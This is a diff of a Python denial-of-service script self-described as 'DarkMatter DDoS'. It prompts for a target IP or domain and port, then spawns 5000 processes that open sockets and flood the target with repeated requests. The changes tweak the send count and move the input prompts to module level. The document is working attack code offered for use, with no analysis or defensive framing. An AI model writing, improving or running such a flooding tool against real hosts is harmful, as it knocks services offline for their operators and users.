@@ -35,26 +35,25 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(100):
+      for y in range(80):
           atk.send(str.encode(request))
     except socket.error:
       sleep(.1)
     except:
       pass
 
+print("Welcome To DarkMatter DDoS\n")
+ip = input("IP/Domain: ")
+port = int(input("Port: "))
+url = f"http://{str(ip)}"
+print("[>>>] Starting the attack [<<<]")
+sleep(1)
 
 def send2attack():
-  print("Welcome To DarkMatter DDoS\n")
-  ip = input("IP/Domain: ")
-  port = int(input("Port: "))
-  url = f"http://{str(ip)}"
-  print("[>>>] Starting the attack [<<<]")
-  sleep(1)
-
   for i in range(5000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
 
     
-send2attack() #61 lines for the most powerful attack, cool?
+send2attack()
